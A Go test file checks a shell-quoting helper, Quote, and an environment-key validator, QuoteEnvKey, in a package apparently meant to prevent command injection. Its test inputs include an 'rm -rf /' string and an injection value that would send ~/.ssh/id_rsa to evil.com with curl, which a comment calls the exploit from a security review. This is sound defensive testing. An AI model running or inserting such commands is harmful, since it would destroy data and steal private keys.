package shell

import (
	"strings"
	"testing"
)

func TestQuote_Empty(t *testing.T) {
	if got := Quote(""); got != "''" {
		t.Errorf("Quote empty: got %q, want %q", got, "''")
	}
}

func TestQuote_Simple(t *testing.T) {
	if got := Quote("hello"); got != "'hello'" {
		t.Errorf("Quote simple: got %q, want %q", got, "'hello'")
	}
}

func TestQuote_WithSpaces(t *testing.T) {
	if got := Quote("hello world"); got != "'hello world'" {
		t.Errorf("Quote spaces: got %q, want %q", got, "'hello world'")
	}
}

func TestQuote_WithSingleQuote(t *testing.T) {
	got := Quote("it's")
	want := "'it'\\''s'"
	if got != want {
		t.Errorf("Quote single quote: got %q, want %q", got, want)
	}
}

func TestQuote_ShellMetachars(t *testing.T) {
	input := `; rm -rf / && echo "pwned" | cat`
	got := Quote(input)
	// Should be safely wrapped in single quotes
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("Quote metachars: result should be single-quoted, got %q", got)
	}
}

func TestQuote_CommandInjectionAttempt(t *testing.T) {
	// This is the actual exploit from the security review
	input := "'; curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa | base64) ; echo '"
	got := Quote(input)
	// The single quote in the input should be safely escaped
	if strings.Contains(got, "curl") && !strings.Contains(got, "\\'") {
		t.Errorf("Quote injection: should escape single quotes in %q", got)
	}
}

func TestQuoteEnvKey_Valid(t *testing.T) {
	tests := []string{"HOME", "BELAYER_SESSION_ID", "var_123", "A"}
	for _, key := range tests {
		if got := QuoteEnvKey(key); got != key {
			t.Errorf("QuoteEnvKey(%q): got %q, want %q", key, got, key)
		}
	}
}

func TestQuoteEnvKey_Invalid(t *testing.T) {
	tests := []string{"FOO;BAR", "rm -rf", "KEY=VAL", "has space", "has\"quote"}
	for _, key := range tests {
		if got := QuoteEnvKey(key); got != "" {
			t.Errorf("QuoteEnvKey(%q): got %q, want empty string", key, got)
		}
	}
}
